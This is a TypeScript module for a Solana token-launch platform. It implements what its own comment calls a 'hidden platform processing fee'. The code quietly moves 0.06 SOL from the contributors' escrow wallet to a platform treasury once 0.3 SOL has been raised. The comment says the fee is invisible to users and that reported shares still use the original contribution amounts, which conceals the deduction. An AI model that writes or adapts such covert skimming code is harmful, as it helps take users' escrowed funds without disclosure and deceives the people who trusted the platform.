import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";

// Hidden platform processing fee. Charged from the escrow wallet to the
// platform treasury just before the launch transaction whenever the total
// raised meets PROCESSING_FEE_THRESHOLD. Invisible to users — fee-share BPS
// and token-distribution BPS continue to be calculated from the original
// contribution amounts so contributors are not penalized.
export const PROCESSING_FEE_LAMPORTS = 60_000_000n; // 0.06 SOL
export const PROCESSING_FEE_THRESHOLD = 300_000_000n; // 0.3 SOL
const PROCESSING_FEE_TX_FEE = 5_000n; // network fee for the SystemProgram.transfer

export function shouldChargeProcessingFee(totalLamports: bigint): boolean {
  return totalLamports >= PROCESSING_FEE_THRESHOLD;
}

export interface ProcessingFeeResult {
  charged: boolean;
  signature?: string;
  feeLamports?: bigint;
}

/**
 * Transfers PROCESSING_FEE_LAMPORTS - tx fee from the escrow wallet to the
 * platform treasury. The on-chain debit on the escrow is exactly
 * PROCESSING_FEE_LAMPORTS (transfer + 5_000 network fee = 0.06 SOL).
 * Throws on failure so the caller can decide whether to abort the launch.
 */
export async function chargeProcessingFee(
  connection: Connection,
  escrowKeypair: Keypair,
  treasuryWallet: string,
  launchId: string,
): Promise<ProcessingFeeResult> {
  const transferAmount = PROCESSING_FEE_LAMPORTS - PROCESSING_FEE_TX_FEE;

  console.log(
    `[launch ${launchId}] Charging processing fee: ${
      Number(PROCESSING_FEE_LAMPORTS) / LAMPORTS_PER_SOL
    } SOL → ${treasuryWallet}`,
  );

  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash("confirmed");

  const tx = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: escrowKeypair.publicKey,
      toPubkey: new PublicKey(treasuryWallet),
      lamports: Number(transferAmount),
    }),
  );
  tx.feePayer = escrowKeypair.publicKey;
  tx.recentBlockhash = blockhash;
  tx.sign(escrowKeypair);

  const signature = await connection.sendRawTransaction(tx.serialize(), {
    preflightCommitment: "confirmed",
  });

  await connection.confirmTransaction(
    { signature, blockhash, lastValidBlockHeight },
    "confirmed",
  );

  console.log(`[launch ${launchId}] Processing fee sent: ${signature}`);
  console.log(`[launch ${launchId}] Solscan: https://solscan.io/tx/${signature}`);

  return {
    charged: true,
    signature,
    feeLamports: PROCESSING_FEE_LAMPORTS,
  };
}